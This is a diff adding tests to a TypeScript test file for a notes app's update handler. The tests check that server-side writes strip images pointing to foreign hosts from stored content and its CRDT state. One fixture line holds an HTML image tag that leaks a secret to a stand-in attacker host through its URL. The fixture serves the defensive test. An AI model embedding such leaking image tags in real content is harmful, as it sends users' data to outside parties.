@@ -28,6 +28,19 @@ import { UpdateNoteHandler } from './update-note.handler';
 const clientStateFor = (html: string): Buffer =>
   htmlToYjsModule.htmlToYjsState(html);
 
+const FOREIGN_FIGURE =
+  '<figure data-image=""><img src="https://attacker.example/leak?d=secret" alt=""><figcaption></figcaption></figure>';
+const BLOB_FIGURE =
+  '<figure data-image=""><img src="https://knowtis.public.blob.vercel-storage.com/notes/n1/a.webp" alt="a"><figcaption></figcaption></figure>';
+
+function renderedState(state: Buffer): string {
+  const doc = new Y.Doc();
+  Y.applyUpdate(doc, new Uint8Array(state));
+  const html = htmlToYjsModule.yDocToHtml(doc);
+  doc.destroy();
+  return html;
+}
+
 const mockNote: NoteEntity = {
   id: 'note-1',
   title: 'Original Title',
@@ -428,6 +441,48 @@ describe('UpdateNoteHandler', () => {
     const replayedHtml = htmlToYjsModule.yDocToHtml(replayed);
     replayed.destroy();
     expect(replayedHtml).toBe(html);
+  });
+
+  it('stores the content its CRDT state renders on a server-side write, so a foreign image is in neither', async () => {
+    vi.spyOn(mockRepository, 'findById').mockResolvedValue({
+      ...mockNote,
+      yjsState: clientStateFor('<p>Original</p>'),
+    });
+    vi.spyOn(mockRepository, 'updateContentWithYjsState').mockResolvedValue(
+      ok(mockNote)
+    );
+
+    const result = await handler.execute({
+      noteId: 'note-1',
+      userId: 'owner-1',
+      content: `<p>Kept</p>${FOREIGN_FIGURE}${BLOB_FIGURE}`,
+    });
+
+    expect(result.isOk()).toBe(true);
+    const [, dataArg, bufferArg] = vi.mocked(
+      mockRepository.updateContentWithYjsState
+    ).mock.calls[0];
+    expect(dataArg.content).toBe(`<p>Kept</p>${BLOB_FIGURE}`);
+    expect(renderedState(bufferArg as Buffer)).toBe(dataArg.content);
+  });
+
+  it('stores the content an editor sends with its own CRDT state untouched', async () => {
+    const editorContent = `<p>Editor</p>${FOREIGN_FIGURE}`;
+    vi.spyOn(mockRepository, 'findById').mockResolvedValue(mockNote);
+    vi.spyOn(mockRepository, 'updateContentWithYjsState').mockResolvedValue(
+      ok(mockNote)
+    );
+
+    await handler.execute({
+      noteId: 'note-1',
+      userId: 'owner-1',
+      content: editorContent,
+      yjsState: clientStateFor('<p>Editor</p>').toString('base64'),
+    });
+
+    const [, dataArg] = vi.mocked(mockRepository.updateContentWithYjsState).mock
+      .calls[0];
+    expect(dataArg).toEqual({ content: editorContent });
   });
 
   it('should reject a yjsState sent without content', async () => {
